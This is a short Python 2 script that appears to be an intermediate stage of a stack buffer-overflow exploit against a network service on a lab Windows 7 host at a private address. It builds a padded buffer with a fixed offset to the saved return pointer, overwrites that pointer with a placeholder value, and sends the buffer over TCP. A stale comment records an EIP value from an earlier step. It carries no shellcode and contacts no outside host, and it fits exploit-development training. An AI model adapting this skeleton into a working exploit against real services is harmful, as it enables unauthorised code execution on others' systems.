#!/usr/bin/python
import socket

ServiceManagerIP = "10.0.2.15"
ServiceManagerPort = 42424

buf_totlen = 400
offset_srp = 146

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += "BBBB"
buf += "CCCC"
buf += "D"*(buf_totlen - len(buf))

# EIP value as a result of running this script = 39654138

# Array of A's


#Attempt to send message
try:
    print "Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to Win7 machine
    connect = s.connect((ServiceManagerIP, ServiceManagerPort))
    s.send(buf + '\r\n')
    s.recv(1024)
    s.close()
    
except:
    print "Could not connect"
